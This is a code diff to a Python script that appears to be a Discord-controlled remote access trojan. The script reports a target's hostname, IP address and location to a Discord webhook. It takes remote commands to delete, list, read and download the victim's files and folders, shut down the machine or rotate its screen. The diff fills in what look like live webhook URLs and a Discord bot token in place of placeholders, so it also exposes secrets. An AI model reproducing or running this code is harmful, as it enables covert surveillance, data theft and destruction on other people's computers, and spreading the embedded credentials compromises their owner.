@@ -25,7 +25,7 @@ IPAddr = socket.gethostbyname(hostname)
 location = geocoder.ip(IPAddr)
 datetime = now.strftime("%d/%m/%Y %H:%M:%S") 
 client = discord.Client()
-webhook = DiscordWebhook(url='#yourwebhookurl', rate_limit_retry=True,
+webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/929296248186474526/dHjfgml0_RcZmjVI2OBNRVuDYOVtwyBAMiZTpgqGYJ2yThymdix8TJqDwG6OFDOq6GH6', rate_limit_retry=True,
                             content=f'`{hostname}` is online! Targets IP-address =`{IPAddr}` Logged in to the targets computer on :- `{datetime}`')
 response = webhook.execute()
 
@@ -46,7 +46,7 @@ async def on_message(message):
     print("Test print successful")
   #display commands
   if msg.startswith(f'.start'):
-    WEBHOOK_URL = "#yourwebhookurl"
+    WEBHOOK_URL = "https://discordapp.com/api/webhooks/929634181942771752/z4jRCVbvQS-UvFWKlVa-xFMgNT_WTz0kSHb15-DQBZBA8KKHqpRL1XCYH29Z4nXudOK0"
     webhook = DiscordWebhook(url=WEBHOOK_URL)
     embed = DiscordEmbed(titLe=".shutdown", description = ".shutdown\n.restart\n.logout\n.delfol + {path of fol}\n.delfil + {path of file}\n.listdir + {path of dir}\n.read + {path of file}\n.downloadfi + {path of file}\n.downloadfo + {path of fol}\n.getinfo\n.rotate", color="03b2f8")
     embed.set_author(name='Commands')
@@ -120,4 +120,4 @@ async def on_message(message):
       sleep(1)
       screen.rotate_to(i*90 % 360)
 
-client.run("#yourservertoken")
+client.run("OTI5Mjc3NzU2MzcyNTgyNDUw.Ydk_Wg.DDqhT-0PYHpryzXXYvubdDaTeTM")
